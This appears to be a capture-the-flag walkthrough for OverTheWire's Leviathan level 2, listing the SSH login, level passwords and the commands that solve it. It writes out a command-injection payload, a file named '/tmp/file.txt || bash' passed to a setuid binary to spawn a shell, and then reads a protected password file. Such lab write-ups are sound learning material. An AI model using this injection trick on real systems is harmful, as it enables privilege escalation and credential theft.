# Level 2 → Level 3

## Solution
```
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```
```
mEh5PNl10e
```
```
ls -al
```
![](0.png)

```
ltrace ./printfile /etc/passwd
```

![](1.png)

```
touch '/tmp/file.txt || bash'
```
```
./printfile '/tmp/file.txt || bash'
```

![](2.png)

```
cat /etc/leviathan_pass/leviathan3
```
```
exit
```
```
rm '/tmp/file.txt || bash'
```

## Password for the next level:
```
Q0G8j4sakn
```
